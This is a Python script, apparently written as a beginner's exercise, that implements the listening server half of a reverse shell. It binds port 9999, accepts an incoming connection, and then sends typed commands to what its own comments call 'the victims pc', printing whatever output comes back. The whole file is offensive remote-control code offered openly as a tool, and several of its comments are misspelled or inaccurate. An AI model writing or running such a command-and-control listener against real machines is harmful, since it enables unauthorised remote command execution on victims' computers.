import socket
import sys

#Creating a Socket(connect two computer)
def create_Socket():
    try:                #try except if socket fails to connet
        global host       #host=ip address
        global port
        global soc        #soc=Socket

        host=""           # "" empty bcz it will be server's ip
        port=9999         # can be any port, best to use less busy port
        soc=socket.socket() #creating socket

    except socket.error as msg:     #why not connecting msg
        print("Socket connection error :"+ str(msg))

#Binding socket and listening connection (binding needed for stable connection)

def bind_socket():
    try:                #try except if socket fails to connet
        global host       #host=ip address
        global port
        global soc
        print("Binding the port: " + str(port))
        soc.bind ((host,port))
        soc.listen(5)       #listen func used to listen from client.after 5 times trying it will show error

    except socket.error as msg:     #why not connecting msg
        print("Socket connection error :"+ str(msg) + "\n" + "Retring.....")
        bind_socket()       #it will retry to connect again,its called recurrction

#Establish connection with client (socket must be listening)

def socket_accept():
    conv,address =soc.accept() #conv=conversation between clien & server, address stroes the ip address
    print("Connection has been established :  |"+"IP :"+address[0]+" |Port: "+str(address[1]))
    send_command(conv)  #to send any command to the clients pc
    conv.close()        #closes the conversation after its doen

#Send command to victims pc

def send_command(conv):
    while True:         #while True is a infinite loop to send multiple commands
        cmd=input()      #cmd stroes the inputs of clients
        if cmd=='quit':   #quit used to break the infinite loop and closes the function
            conv.close()   #closes the converstaion
            soc.close()     #closes Socket
            sys.exit()      #closes the comand prompt

        if len(str.encode(cmd))> 0 : #this if condition converts the bits to sends and recieve data in string formate
            conv.send(str.encode(cmd))
            client_response=str(conv.recv(1024),"utf-8")
            print(client_response,end="")
def main():
    create_Socket()
    bind_socket()
    socket_accept()

main()

